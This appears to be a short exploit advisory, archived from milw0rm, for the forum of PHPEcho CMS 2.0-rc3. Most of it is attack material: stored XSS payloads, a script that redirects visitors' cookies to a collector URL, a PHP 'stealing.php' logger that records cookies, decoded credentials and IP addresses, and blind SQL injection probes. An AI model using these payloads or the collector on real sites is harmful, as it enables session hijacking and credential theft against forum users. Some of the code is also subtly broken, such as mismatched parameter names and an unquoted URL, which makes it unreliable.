@@ -1,0 +1,50 @@
+PHPEcho CMS 2.0-rc3 (forum) XSS Cookie Stealing / Blind Vulnerability
+bug found by Jose Luis Gongora Fernandez (a.k.a) JosS
+
+contact: sys-project[at]hotmail.com
+website: http://www.hack0wn.com/
+
+- download: http://sourceforge.net/project/showfiles.php?group_id=186100
+
+~ [XSS]
+
+  The forum allowed insert javascript code and html code.
+
+  PoC:
+  "><h1>0wned</h1>
+  "><script>alert("JosS b0x");</script>
+  
+  -----------  
+
+  Cookie Stealing:
+  <script>window.location=http://127.0.0.1/stealing.php?cookie=+document.cookie</script>
+
+  stealing.php
+  <?php
+  $archivo = fopen('log.htm','a');
+  $cookie = $_GET['c'];
+  $usuario = $_GET['id']; 
+  $ip = getenv ('REMOTE_ADDR');
+  $re = $HTTPREFERRER;
+
+  $fecha=date("j F, Y, g:i a");
+  fwrite($archivo, '<hr>USER and PASSWORD: '.base64_decode($usuario).'<br>Cookie: '.$cookie.'<br>Pagina: '.$re.'<br> 
+
+  IP: ' .$ip. '<br> Date and Time: ' .$fecha. '</hr>');
+  fclose($archivo);
+  ?>
+
+~ [BLIND]
+
+  PoC:
+  /index.php?module=forum&show=thread&id=1 and 1=2 [False]
+  /index.php?module=forum&show=thread&id=1 and 1=1 [True]
+
+  /index.php?module=forum&show=thread&id=1 AND SUBSTRING(@@version,1,1)=5
+  /index.php?module=forum&show=thread&id=1 AND SUBSTRING(@@version,1,1)=4
+
+
+
+__h0__
+
+# milw0rm.com [2009-06-24]
